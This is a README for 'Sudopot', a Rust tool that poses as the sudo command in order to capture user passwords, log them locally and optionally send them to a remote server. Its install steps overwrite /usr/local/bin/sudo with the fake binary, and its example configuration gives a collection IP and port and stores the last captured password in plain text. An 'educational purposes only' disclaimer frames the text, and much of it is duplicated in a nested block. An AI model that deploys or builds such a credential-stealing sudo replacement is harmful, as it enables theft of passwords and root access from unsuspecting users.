# Sudopot

Sudopot is a cybersecurity tool designed for educational purposes only. It mimics the behavior of the `sudo` command to capture and log user passwords. **Use this tool responsibly and only in environments where you have explicit permission to do so.**

## Features

- Mimics the `sudo` command to capture user passwords.
- Logs captured passwords to a local file.
- Optionally sends captured passwords to a remote server.

## Installation

### Prerequisites

- Rust programming language installed. You can install Rust from [rust-lang.org](https://www.rust-lang.org/).

### Build and Install

1. Clone the repository:
    ```sh
    git clone <repository-url>
    cd sudopot
    ```

2. Build the project:
    ```sh
    cargo build --release
    ```

3. Move the binary to a directory in your PATH:
    ```sh
    sudo mv target/release/sudopot /usr/local/bin/sudo
    ```

4. Ensure the binary is executable:
    ```sh
    sudo chmod +x /usr/local/bin/sudo
    ```

### Automatic Installation (TODO)

An automatic installation script is in progress. Once completed, you will be able to install Sudopot with a single command.

## Usage

Simply use the `sudo` command as you normally would. Sudopot will capture the password and log it.

```sh
sudo <your-command>
```

```markdown
# Sudopot

Sudopot is a cybersecurity tool designed for educational purposes only. It mimics the behavior of the `sudo` command to capture and log user passwords. **Use this tool responsibly and only in environments where you have explicit permission to do so.**

## Features

- Mimics the `sudo` command to capture user passwords.
- Logs captured passwords to a local file.
- Optionally sends captured passwords to a remote server.

## Installation

### Prerequisites

- Rust programming language installed. You can install Rust from [rust-lang.org](https://www.rust-lang.org/).

### Build and Install

1. Clone the repository:
    ```sh
    git clone <repository-url>
    cd sudopot
    ```

2. Build the project:
    ```sh
    cargo build --release
    ```

3. Move the binary to a directory in your PATH:
    ```sh
    sudo mv target/release/sudopot /usr/local/bin/sudo
    ```

4. Ensure the binary is executable:
    ```sh
    sudo chmod +x /usr/local/bin/sudo
    ```

### Automatic Installation (TODO)

An automatic installation script is in progress. Once completed, you will be able to install Sudopot with a single command.

## Usage

Simply use the `sudo` command as you normally would. Sudopot will capture the password and log it.

```sh
sudo <your-command>
```

## Configuration

Sudopot stores its configuration in a YAML file located at `~/.local/share/.sudopot`. The configuration file includes the following fields:

- `ip`: The IP address of the remote server to send captured passwords.
- `port`: The port of the remote server.
- `password`: The last captured password.

## Example Configuration

```yaml
ip: "192.168.1.100"
port: "8080"
password: ""
```

## Disclaimer

This tool is intended for educational purposes only. The author is not responsible for any misuse of this tool. Use it responsibly and only in environments where you have explicit permission to do so.